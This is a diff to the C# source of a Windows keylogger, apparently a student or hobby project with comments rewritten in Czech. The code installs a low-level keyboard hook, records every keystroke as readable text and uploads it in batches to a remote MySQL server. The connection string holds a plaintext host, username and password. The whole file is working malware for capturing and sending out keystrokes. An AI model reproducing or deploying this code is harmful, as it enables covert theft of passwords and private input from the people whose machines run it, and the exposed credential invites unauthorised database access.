@@ -1,9 +1,7 @@
 ﻿using System;
-using System.Runtime.InteropServices; // For DLL and reading keystrokes from memory
-using System.Diagnostics; // For building a hook for gaining access to running processes and modules.
-using System.Windows.Forms; // For running of application and converting keystrokes
-using System.IO;
-using System.Net.Mail;
+using System.Runtime.InteropServices; 
+using System.Diagnostics;
+using System.Windows.Forms;
 using System.Text;
 using MySql.Data.MySqlClient;
 
@@ -11,51 +9,59 @@ namespace KeyLogger
 {
     class Logger
     {
-        private static int WH_KEYBOARD_LL = 13; // Monitor for low-level keyboard inputs events
-        private static int WM_KEYDOWN = 0x0100; //Identifier of the keyboard message. Non-system key (ALT is not pressed)
-        private static IntPtr hook = IntPtr.Zero;     // Representation of pointer of handler. ZERO = readOnly
-        private static LowLevelKeyboardProc llkProcedure = HookCallback;    //Delegate of the HookCallback. The HookCallback function defines what we want to do every time a new keyboard input event takes place.
-
-        private static StringBuilder stringBuilder;
-
-        private static string connectionString = "";
-
+        private static int WH_KEYBOARD_LL = 13; // Konstanta pro zachytávání low level inputů
+        private static int WM_KEYDOWN = 0x0100;  // konstanta pro stisk klavesy 
+        private static IntPtr hook = IntPtr.Zero; // Adresa hook procedury - default 0
+        private static LowLevelKeyboardProc llkProcedure = HookCallback; // Zavěšení callbacku na stisk klávesy
+        
+        private static StringBuilder loggedKeysString;
+        private static string connectionString = "server=db1.forsite.cz;database=vsb;uid=vsb;pwd=SnhIAIZ3;";
+       
         public Logger()
         {
-            stringBuilder = new StringBuilder();
+            loggedKeysString = new StringBuilder();
         }
 
         public void Start()
         {
-            hook = SetHook(llkProcedure);   //Defining our hook
-            Application.Run();              // Main loop
+            // Dáme hook do systémových volání
+            hook = SetHook(llkProcedure);
+            Application.Run();
+            // Odstraní hook
             UnhookWindowsHookEx(hook);
         }
 
+        // nastavení čtení na stisk klávesy - namapování
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             Process currentProcess = Process.GetCurrentProcess();
             ProcessModule currentModule = currentProcess.MainModule;
             String moduleName = currentModule.ModuleName;
             IntPtr moduleHandle = GetModuleHandle(moduleName);
-            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);    // Build and return SetWindowsHookEx function
+            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int ncode, IntPtr wParam, IntPtr lparam);
 
+        // Funkce je zavolána automaticky po stisku klávesy - když se zavolá hook
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)  //wParam is pressed
+            // nCode slouží pro určení jak zpracovat zprávu. Pokud je < 0 tak nezpracvováváme. Když zmáčkneme klávesu tak je hodnota 0
+            // wParam musí odpovídat 0x0100 - zmáčknutá klávesa
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-
-                if (stringBuilder.Length >= 100)
+                // Pokud je délka zachyceného stringu >= 200 odešleme zachycené data
+                if (loggedKeysString.Length >= 200)
                 {
                     SendToDatabase();
                 }
-                int vkCode = Marshal.ReadInt32(lParam);     //Gets int value stored in the memory address held in lParam
+                // čte low level inputy
+                int vkCode = Marshal.ReadInt32(lParam);
+                // Vrátí stistknutou klávesu v lidské podobě
                 string readableCharacter = GetReadableCharacter(vkCode);
-                stringBuilder.Append(readableCharacter);
+                loggedKeysString.Append(readableCharacter);
             }
+            //´zavolá další proceduru
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
@@ -108,30 +114,34 @@ namespace KeyLogger
             }
         }
 
-
+        // Odešle zachycená data
         private static void SendToDatabase()
         {
             MySqlConnection conn = new MySqlConnection(connectionString);
             conn.Open();
             MySqlCommand comm = conn.CreateCommand();
             comm.CommandText = "INSERT INTO keylogger (text) VALUES(@text)";
-            comm.Parameters.AddWithValue("@text", stringBuilder.ToString());
+            comm.Parameters.AddWithValue("@text", loggedKeysString.ToString());
             comm.ExecuteNonQuery();
             conn.Close();
 
-            stringBuilder.Clear();
+            loggedKeysString.Clear();
         }
 
+        // Importy
 
+        // Zavolá další událost ze systémových volání.
         [DllImport("user32.dll")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetModuleHandle(String lpModulename);
 
+        // zavedení vlastní události do systémových událostí
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
+        // Odstraní událost ze systémových volání.
         [DllImport("user32.dll")]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
